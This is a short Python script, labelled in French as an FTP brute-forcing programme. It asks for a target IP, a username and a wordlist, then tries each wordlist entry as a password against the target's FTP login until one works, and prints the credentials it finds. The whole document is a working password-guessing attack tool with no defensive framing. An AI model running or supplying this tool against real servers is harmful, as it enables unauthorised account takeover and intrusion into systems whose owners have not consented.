
# Programme de brute forcing du protocole FTP

import sys,os
from ftplib import FTP
import ftplib

global host, password, user, resp

def ftpconnect(password):
    try:
        ftpco = FTP(host)
    except:
        resp = 2
        return resp

    try:
        ftpco.login(user,password)
        resp = 0
        ftpco.quit()
    except:
        resp = 1
    return resp 
    ftpco.quit()

try:
    host = input("Enter target IP > ")
    user = input("Enter username > ")
    wordlist = input("Enter Wordlist Path > ")

    if os.path.exists(wordlist) == False:
        sys.exit("\nWordlist doesn't exist Or Wrong Path \n")

except KeyboardInterrupt:
    sys.exit("\nUser Interrupt")

inputfile = open(wordlist,"r")

for i in inputfile.readlines():
    password = i.strip()

    try:
        response = ftpconnect(password)
        if response == 0:
            print("\nUser : {0} | Password Found : {1} \n".format(user,password))
            sys.exit(0)
        elif response == 1:
            print("User : {0} | Password : {1} | Login Incorrect".format(user,password))
        elif response == 2:
            sys.exit("Connection Cannot be Etablished with Host")
    except KeyboardInterrupt:
        sys.exit("\nUser Interrupt")


    
